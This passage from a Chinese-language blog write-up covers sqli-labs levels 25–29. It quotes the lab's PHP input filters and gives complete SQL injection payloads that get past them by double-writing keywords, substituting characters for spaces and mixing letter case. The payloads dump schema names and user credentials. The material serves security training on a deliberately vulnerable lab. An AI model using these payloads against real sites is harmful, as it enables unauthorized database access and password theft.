src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/06.png" srcset="/img/loading.gif" alt="Less-25(过滤or和and)"></p><p>爆破列名</p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> infoorrmation_schema.columns  <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/07.png" srcset="/img/loading.gif" alt="Less-25(过滤or和and)"></p><h3 id="爆破出数据"><a href="#爆破出数据" class="headerlink" title="爆破出数据"></a>爆破出数据</h3><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd+SEPARATOORR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/08.png" srcset="/img/loading.gif" alt="Less-25(过滤or和and)"></p><h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=$id</code></td></tr></tbody></table><p>与 Less-25 相比，只是拼接方式改变，因为代码中没有输出报错信息，所以也无法进行报错注入，其他利用方式都是一样的，这里不再啰嗦。</p><pre><code class="hljs sql">?id=-1 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd+SEPARATOORR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-26-过滤or、and、-、注释、空格和斜线"><a href="#Less-26-过滤or、and、-、注释、空格和斜线" class="headerlink" title="Less-26(过滤or、and、/*、注释、空格和斜线)"></a>Less-26(过滤or、and、/*、注释、空格和斜线)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># 过滤了 or 和 and 大小写</span>
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);            <span class="hljs-comment">//strip out OR (non case sensitive)</span>
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/and/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//Strip out AND (non case sensitive)</span>

<span class="hljs-comment"># 过滤了 /*</span>
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//strip out /*</span>

<span class="hljs-comment"># 过滤了 -- 和 # 注释</span>
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//Strip out --</span>
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);            <span class="hljs-comment">//Strip out #</span>

<span class="hljs-comment"># 过滤了空格</span>
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\s]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//Strip out spaces</span>

<span class="hljs-comment"># 过滤了斜线</span>
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//Strip out slashes</span>
<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;</code></pre><p>过滤了 or 和 and 可以采用 双写或者 &amp;&amp; || 绕过</p><p>过滤注释 可以使用闭合绕过</p><p>过滤了空格 可以使用如下的符号来替代：</p><table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>%09</td><td>TAB 键(水平)</td></tr><tr><td>%0a</td><td>新建一行</td></tr><tr><td>%0c</td><td>新的一页</td></tr><tr><td>%0d</td><td>return 功能</td></tr><tr><td>%0b</td><td>TAB 键(垂直)</td></tr><tr><td>%a0</td><td>空格</td></tr></tbody></table><p><strong>由于我在windows下无法使用一些特殊的字符代替空格，此处是因为apache的解析的问题。</strong></p><p>直接使用报错注入</p><h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h3><p>（在hackbar中输入&amp;&amp;时，需要自行URL编码为%26%26，否则会报错，而输入||不需要）</p><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())),<span class="hljs-number">1</span>)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/09.png" srcset="/img/loading.gif" alt="Less-25(过滤or和and)"></p><h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/10.png" srcset="/img/loading.gif" alt="Less-25(过滤or和and)"></p><p>but 好像不行，过滤了<code>空格</code>和<code>or</code></p><p>绕过</p><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(table_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>))),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/11.png" srcset="/img/loading.gif" alt="Less-25(过滤or和and)"></p><h3 id="爆破列名"><a href="#爆破列名" class="headerlink" title="爆破列名"></a>爆破列名</h3><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.columns)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>table_name=<span class="hljs-string">&#x27;users&#x27;</span>))),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/12.png" srcset="/img/loading.gif" alt="Less-25(过滤or和and)"></p><h3 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h3><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>))),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span>
<span class="hljs-string"></span>
<span class="hljs-string">?id=1&#x27;</span>||updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-string">&#x27;:&#x27;</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)<span class="hljs-keyword">where</span>(username=<span class="hljs-string">&#x27;admin&#x27;</span>))),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/13.png" srcset="/img/loading.gif" alt="Less-25(过滤or和and)"></p><h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>与 Less-26 相比，只是拼接方式改变了，<code>因为没有输出报错信息，所以不能使用报错注入了</code>，只能被迫抛弃win环境使用docker，直接上payload。</p><pre><code class="hljs sql">?id=999&#x27;)%a0union%a0select%a01,database(),3||(&#x27;1&#x27;)=(&#x27;1

?id=999&#x27;)%a0union%a0select%a01,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(table_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>)),<span class="hljs-number">3</span>||(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span>
<span class="hljs-string"></span>
<span class="hljs-string">?id=999&#x27;</span>)%a0union%a0select%a01,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.columns)<span class="hljs-keyword">where</span>(table_name=<span class="hljs-string">&#x27;users&#x27;</span>)),<span class="hljs-number">3</span>||(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span>
<span class="hljs-string"></span>
<span class="hljs-string">?id=999&#x27;</span>)%a0union%a0select%a01,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span>||(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span></code></pre><h2 id="Less-27-过滤了很多"><a href="#Less-27-过滤了很多" class="headerlink" title="Less-27(过滤了很多)"></a>Less-27(过滤了很多)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>查看代码，过滤规则又增加了许多：</p><pre><code class="hljs php"><span class="hljs-comment"># 过滤了 /*</span>
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);
<span class="hljs-comment"># 过滤了 -</span>
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);
<span class="hljs-comment"># 过滤了 #</span>
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);
<span class="hljs-comment"># 过滤了空格</span>
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);
<span class="hljs-comment"># 过滤了 select /m 严格模式 不可以使用双写绕过</span>
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/select/m&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/Select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/SELECT/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);

<span class="hljs-comment"># 过滤了 union UNION</span>
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/Union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/UNION/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);
<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;</code></pre><blockquote><p>PHP语法</p></blockquote><blockquote><p>正则表达式</p></blockquote><p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers">PHP正则表达式的模式修饰符（官方文档）</a><br><a target="_blank" rel="noopener" href="http://www.php.cn/php-weizijiaocheng-354831.html">PHP正则中的i,m,s,x,e</a></p><blockquote><ul><li><code>i</code><br>如果设定了此修正符，模式中的字符将同时匹配大小写字母。</li><li><code>m</code><br>如果设定了此修正符，行起始和行结束除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。</li><li><code>s</code><br>如果设定了此修正符，模式中的圆点元字符<code>.</code>匹配所有的字符，包括换行符。没有此设定的话，则不包括换行符。</li><li><code>x</code><br>如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略，在未转义的字符类之外的<code>#</code>以及下一个换行符之间的所有字符，包括两头，也都被忽略。</li><li><code>e</code><br>如果设定了此修正符，<code>preg_replace()</code>在替换字符串中对逆向引用作正常的替换。</li><li><code>?</code><br>在<code>.</code>/<code>+</code>/<code>*</code>之后表示非贪婪匹配，<code>.</code>/<code>+</code>/<code>*</code>限定符都是贪婪的，它们会尽可能多的匹配文字，在它们的后面加上一个<code>?</code>就可以实现非贪婪或最小匹配。</li></ul></blockquote><p>union 和 select 没有忽略大小写 导致写了很多冗杂的规则，但还是可以轻易绕过。</p><pre><code class="hljs bash"><span class="hljs-comment"># 大小写混写</span>
unioN
unIon
seLect
...

<span class="hljs-comment"># 嵌套双写</span>
uunionnion
sselectelect
ununionion
...</code></pre><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>单引号字符型，过滤掉了#,–,空格等字符</p><pre><code class="hljs sql">?id=1&#x27;||&#x27;1&#x27;=&#x27;1</code></pre><p>成功闭合<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/14.png" srcset="/img/loading.gif" alt="Less-27"></p><h3 id="判断数据库名"><a href="#判断数据库名" class="headerlink" title="判断数据库名"></a>判断数据库名</h3><pre><code class="hljs sql">?id=999&#x27;%0aunIon%0aselEct%0a1,database(),3%0a||&#x27;1&#x27;=&#x27;1
<span class="hljs-comment">#使用%0a代替空格，unIon、selEct随机大小写绕过，-被过滤了，使用999让其爆出显错位</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/15.png" srcset="/img/loading.gif" alt="Less-27"></p><h3 id="判断表名"><a href="#判断表名" class="headerlink" title="判断表名"></a>判断表名</h3><pre><code class="hljs sql">?id=999&#x27;%0aunIon%0aselEct%0a1,(<span class="hljs-keyword">selEct</span>(<span class="hljs-keyword">group_concat</span>(table_name))<span class="hljs-keyword">from</span>(information_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>)),<span class="hljs-number">3</span>%<span class="hljs-number">0</span>a||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/16.png" srcset="/img/loading.gif" alt="Less-27"></p><h3 id="判断列名"><a href="#判断列名" class="headerlink" title="判断列名"></a>判断列名</h3><pre><code class="hljs sql">?id=999&#x27;%0aunIon%0aselEct%0a1,(<span class="hljs-keyword">selEct</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_name=<span class="hljs-string">&#x27;users&#x27;</span>)),<span class="hljs-number">3</span>%<span class="hljs-number">0</span>a||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/17.png" srcset="/img/loading.gif" alt="Less-27"></p><h3 id="得到数据"><a href="#得到数据" class="headerlink" title="得到数据"></a>得到数据</h3><pre><code class="hljs sql">?id=999&#x27;%0aunIon%0aselEct%0a1,(<span class="hljs-keyword">selEct</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span>%<span class="hljs-number">0</span>a||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/18.png" srcset="/img/loading.gif" alt="Less-27"></p><blockquote><p>总结</p></blockquote><p>1 这里空格<code>%0a</code>代替</p><p>2这里正则表达式是只要你含有 就会一直匹配 双写不能绕过</p><p>3当-1不能用的时候 随便用一个错误的值把显示的位置让出来 给你要的数据</p><h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-27 相比，只是拼接方式发生了改变，又因为没有报错日志的输出，所以少了报错注入的利用方式，利用方式换汤不换药，这里不做演示了。</p><pre><code class="hljs sql">?id=999&quot;%0aunIon%0aselEct%0a1,(<span class="hljs-keyword">selEct</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span>%<span class="hljs-number">0</span>a||<span class="hljs-string">&quot;1&quot;</span>=<span class="hljs-string">&quot;1</span></code></pre><h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>过滤规则如下：</p><pre><code class="hljs Php"><span class="hljs-comment"># 过滤 /*</span>
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);

<span class="hljs-comment"># 过滤 - # 注释</span>
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);

<span class="hljs-comment"># 过滤 空格 +</span>
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);.

<span class="hljs-comment"># 过滤 union select /i 大小写都过滤</span>
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);
<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;</code></pre><p>这里 union 和 select 这里可以使用双写嵌套绕过，过滤了注释的话 就使用闭合绕过，过滤了空格使用 Less-26 的编码绕过，OK分析完成后直接放完整的 payload 吧：</p><pre><code class="hljs sql">?id=999&#x27;)%a0union%a0select%a01,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span>%a0SEPARATOR%a00x3c62723e))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span>||(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span></code></pre><h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>比 Less-28 还少了几个过滤规则，可以直接使用 Less-28 的payload：</p><h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><p>这一题和注入天书里面描述的环境不太一样，还是具体分析看下代码吧。</p><ul><li><code>index.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-comment"># id = &#x27;x&#x27; 的拼接方式</span>
<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;

<span class="hljs-keyword">if</span> 查询到结果:
    输出查询的详细信息
<span class="hljs-keyword">else</span>:
    print_r(mysql_error());</code></pre><p>从源码来看的话和前面的貌似没有啥区别，直接尝试联合注入看看吧：</p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p>这个 index.php 太简单了，不知道啥意思，下面直接重点来看 login.php 吧：</p><ul><li><code>login.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-comment"># 查询 query 的字符串</span>
<span class="hljs-variable">$qs</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];

<span class="hljs-comment"># 模拟 tomcat 的查询函数 处理一下</span>
<span class="hljs-variable">$id1</span>=java_implimentation(<span class="hljs-variable">$qs</span>);
<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];

<span class="hljs-comment"># 再次过滤检测</span>
whitelist(<span class="hljs-variable">$id1</span>);

<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;

<span class="hljs-keyword">if</span> 查询到结果:
    输出查询的详细信息
<span class="hljs-keyword">else</span>:
    print_r(mysql_error());
<span class="hljs-meta">?&gt;</span>

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">java_implimentation</span>(<span class="hljs-params"><span class="hljs-variable">$query_string</span></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-variable">$q_s</span> = <span class="hljs-variable">$query_string</span>;
    <span class="hljs-comment"># &amp; 作为分隔符 分割字符串</span>
    <span class="hljs-variable">$qs_array</span>= explode(<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-variable">$q_s</span>);

    <span class="hljs-comment"># 遍历 qs_array 数组</span>
    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$qs_array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)
    &#123;    
        <span class="hljs-variable">$val</span>=substr(<span class="hljs-variable">$value</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>);
        <span class="hljs-comment"># 如果数组前两位是 id 的话</span>
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$val</span>==<span class="hljs-string">&quot;id&quot;</span>)
        &#123;    
            <span class="hljs-comment"># 截取 $value 的3-30 的字符串 作为 id 的值 </span>
            <span class="hljs-variable">$id_value</span>=substr(<span class="hljs-variable">$value</span>,<span class="hljs-number">3</span>,<span class="hljs-number">30</span>); 
